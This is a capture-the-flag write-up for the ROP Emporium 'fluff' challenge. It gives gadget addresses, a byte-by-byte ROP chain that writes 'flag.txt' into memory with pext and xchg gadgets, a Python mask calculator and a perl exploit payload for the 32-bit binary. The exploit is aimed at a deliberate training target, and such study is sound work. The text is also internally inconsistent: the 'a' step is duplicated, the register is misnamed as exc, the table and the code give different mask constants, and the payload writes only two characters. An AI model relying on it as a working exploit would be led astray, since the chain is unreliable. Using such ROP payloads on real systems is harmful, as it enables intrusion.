# fluff
The challenge is available [here](https://ropemporium.com/challenge/fluff.html).

## Black-Box Test

## In-depth research

## Solution
In the following table, the important addresses for constructing the ROP chain are summarized, along with a brief description of each.

| Name          | Type            | Address    | Description                                                                      |
|---------------|-----------------|------------|----------------------------------------------------------------------------------|
| print_file    | Func            | 0x080483d0 | The entry address in the PLT table.                                              |
| memory4string | Writable Memory | 0x0804a018 | .data segment addr will be where the string "flag.txt" is placed.                |
| pop_bswap_cx        | Gadget          | 0x08048558 | pop ecx;<br />bswap ecx;<br />ret;                                                         |
| pop_bp        | Gadget          | 0x080485bb | pop ebp;<br />ret;                                                                    |
| prepare_dx       | Gadget          | 0x08048543 | mov eax, ebx;<br />mov ebx, 0xb0bababa;<br />pext edx, ebx, eax;<br />mov eax, 0xdeadbeef; ret; |
| exchange_byte | Gadget          | 0x08048555 | xchg BYTE PTR [exc], dl;<br />ret;                                                    |

And the next table describes the ROP chain itself:

| No | Chain Link                        | Note                                                                                                                                                                                                                                                                    |
|----|-----------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1  | 44 garbage bytes                  |                                                                                                                                                                                                                                                                         |
| 2  | pop_bswap_cx, memory4string       | `memory4string` in big-endian.                                                                                                                                                                                                                                          |
| 3  | pop_bp, get_mask("f")             | The function `get_mask` calculates the bit sequence needed<br/>for a register that serves as a mask in the `xchg` instruction<br/>(with a constant value of `0xdeadbeef` on which the mask operates)<br/>so that the operation produces the desired character. In this case, `"f"`. |
| 4  | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 5  | exchange_byte                     | After this operation, the string will be `"f"`                                                                                                                                                                                                                          |
| 6  | pop_bswap_cx, memory4string+1     | `memory4string+1` in big-endian.                                                                                                                                                                                                                                        |
| 7  | pop_bp, get_mask("l")             |                                                                                                                                                                                                                                                                         |
| 8  | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 9  | exchange_byte                     | After this operation, the string will be `"fl"`                                                                                                                                                                                                                         |
| 10 | pop_bswap_cx, memory4string+2     | `memory4string+2` in big-endian.                                                                                                                                                                                                                                        |
| 11 | pop_bp, get_mask("a")             |                                                                                                                                                                                                                                                                         |
| 12 | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 13 | exchange_byte                     | After this operation, the string will be `"fla"`                                                                                                                                                                                                                        |
| 14 | pop_bswap_cx, memory4string+3     | `memory4string+3` in big-endian.                                                                                                                                                                                                                                        |
| 15 | pop_bp, get_mask("a")             |                                                                                                                                                                                                                                                                         |
| 16 | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 17 | exchange_byte                     | After this operation, the string will be `"fla"`                                                                                                                                                                                                                        |
| 18 | pop_bswap_cx, memory4string+4     | `memory4string+4` in big-endian.                                                                                                                                                                                                                                        |
| 19 | pop_bp, get_mask("g")             |                                                                                                                                                                                                                                                                         |
| 20 | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 21 | exchange_byte                     | After this operation, the string will be `"flag"`                                                                                                                                                                                                                       |
| 22 | pop_bswap_cx, memory4string+5     | `memory4string+5` in big-endian.                                                                                                                                                                                                                                        |
| 23 | pop_bp, get_mask(".")             |                                                                                                                                                                                                                                                                         |
| 24 | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 25 | exchange_byte                     | After this operation, the string will be `"flag."`                                                                                                                                                                                                                      |
| 26 | pop_bswap_cx, memory4string+6     | `memory4string+6` in big-endian.                                                                                                                                                                                                                                        |
| 27 | pop_bp, get_mask("t")             |                                                                                                                                                                                                                                                                         |
| 28 | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 29 | exchange_byte                     | After this operation, the string will be `"flag.t"`                                                                                                                                                                                                                     |
| 30 | pop_bswap_cx, memory4string+7     | `memory4string+7` in big-endian.                                                                                                                                                                                                                                        |
| 31 | pop_bp, get_mask("x")             |                                                                                                                                                                                                                                                                         |
| 32 | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 33 | exchange_byte                     | After this operation, the string will be `"flag.tx"`                                                                                                                                                                                                                    |
| 34 | pop_bswap_cx, memory4string+8     | `memory4string+8` in big-endian.                                                                                                                                                                                                                                        |
| 35 | pop_bp, get_mask("t")             |                                                                                                                                                                                                                                                                         |
| 36 | prepare_dx                        |                                                                                                                                                                                                                                                                         |
| 37 | exchange_byte                     | After this operation, the string will be `"flag.txt"`                                                                                                                                                                                                                   |
| 38 | print_file, "XXXX", memory4string |                                                                                                                                                                                                                                                                         |



```python
def get_mask(target, value):
    target_bits = bin(ord(target))[2:]
    value_bits  = bin(value)[2:]

    mask_bits   = ''

    while(target_bits):
        if target_bits[-1] == value_bits[-1]:
            mask_bits = '1' + mask_bits
            target_bits = target_bits[:-1]
        else:
            mask_bits = '0' + mask_bits

        value_bits = value_bits[:-1]

    while(value_bits):
        if value_bits[-1] == '0':
            mask_bits = '1' + mask_bits
        else:
            mask_bits = '0' + mask_bits
        value_bits = value_bits[:-1]

    mask = int(mask_bits, 2)
    return mask

for c in "flag.txt":
    print(hex(get_mask(c, 0xb0bababa)), c)
```

```
perl -e 'print "X"x44 . "\xbb\x85\x04\x08" . "\x4b\x4b\x45\x4f" . "\x43\x85\x04\x08" . "\x58\x85\x04\x08" . "\x08\x04\xa0\x18" . "\x55\x85\x04\x08" ."\xbb\x85\x04\x08" . "\xdd\x46\x45\x4f" . "\x43\x85\x04\x08" . "\x58\x85\x04\x08" . "\x08\x04\xa0\x19" . "\x55\x85\x04\x08". "\xd0\x83\x04\x08" . "XXXX" . "\x18\xa0\x04\x08"' | ./fluff32
```